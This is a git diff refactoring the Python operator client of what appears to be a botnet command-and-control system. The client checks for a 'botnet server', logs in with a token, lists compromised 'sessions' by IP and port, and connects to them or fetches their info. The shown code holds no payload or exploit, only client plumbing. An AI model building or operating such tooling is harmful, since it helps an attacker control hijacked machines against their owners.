@@ -4,8 +4,8 @@ from argparse import ArgumentParser
 from getpass import getpass
 from os import system
 
-from modules.comms import *
-from modules.read import read_session_file
+from modules.comms import Comms
+from modules.read import read_session_file, get_address_arg, read_session_info
 from modules.colors import Colors
 from modules.help import print_help
 
@@ -31,14 +31,16 @@ try:
 except ValueError: 
     ADDRESS, PORT = host, 10000
 
+comms = Comms(ADDRESS, PORT)
+
 print(f"Connecting to {ADDRESS}:{PORT} ... ", end="")
 
-if not is_alive(ADDRESS):
-    print(f"{c.fail}no.{c.reset}\nError: node seems down. Verify your internet connection.")
+if not comms.is_alive():
+    print(f"{c.fail}no.{c.reset}\nError: node seems down. Verify your internet connection.\n")
     exit(1)
 
-if not is_botnet_server(ADDRESS, PORT):
-    print(f"{c.fail}no.{c.reset}\nError: server does not respond correctly (maybe a mismatched port?)")
+if not comms.is_botnet_server():
+    print(f"{c.fail}no.{c.reset}\nError: server does not respond correctly (maybe a mismatched port?)\n")
     exit(1)
 
 print(f"{c.ok}ok{c.reset}")
@@ -47,7 +49,7 @@ PASSWD = getpass(prompt=f"{USER}'s password: ")
 
 print("Login in... ", end="")
 
-TOKEN = get_token(ADDRESS, PORT, USER, PASSWD)
+TOKEN = comms.get_token(USER, PASSWD)
 
 if TOKEN == 32 * "0": 
     print(f"{c.fail}no.{c.reset}\nLogin failed, check your credentials.")
@@ -70,7 +72,7 @@ while True:
             print_help()
 
         elif command == "sessions":
-            sessions = get_sessions(ADDRESS, PORT, TOKEN)
+            sessions = comms.get_sessions(TOKEN)
             sessions_file = open('sessions.tmp', 'w')
             sessions_file.write(sessions)
             sessions_file.close()
@@ -78,20 +80,17 @@ while True:
             
 
         elif command[:7] == "connect": 
-            _, addr = command.split(' ')
+            ip, port = get_address_arg(command)
+            comms.connect_session(ip, port, TOKEN)
+
+        elif command[:5] == "whois":
             
-            try:
-                ip, port = addr.split(':')
-                port = int(port)
-
-            except ValueError:
-                sessions = open('sessions.tmp', 'r').readlines()
-                index = int(addr)
-                ip, port = sessions[index].strip().split(':')
-                port = int(port)
-
-            connect_session(ADDRESS, PORT, ip, port, TOKEN)
-
+            ip, port = get_address_arg(command)
+            print(f"\n{ip} INFO")
+            print("================")
+            session_info = comms.get_session_info(ip, port, TOKEN)
+            
+            read_session_info(session_info) 
     
     except KeyboardInterrupt:
         system("rm token.tmp")
